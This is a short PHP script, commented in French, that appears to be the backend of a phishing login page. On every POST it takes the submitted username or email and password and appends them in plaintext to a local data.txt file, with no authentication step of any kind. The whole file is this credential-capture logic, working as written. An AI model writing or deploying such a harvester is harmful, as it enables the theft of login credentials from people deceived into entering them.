<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données du formulaire
    $usernameOrEmail = $_POST["username-email"];
    $password = $_POST["password"];

    // Ouverture du fichier en mode ajout pour ajouter les nouvelles données à la fin
    $file = fopen("data.txt", "a");

    // Écrire les données dans le fichier
    fwrite($file, "Username/Email: " . $usernameOrEmail . ", Password: " . $password . "\n");

    // Fermeture du fichier
    fclose($file);
} else {
    $file = fopen("data.txt", "a");
    fwrite($file, "fail " . "\n");
    fclose($file);
}
?>
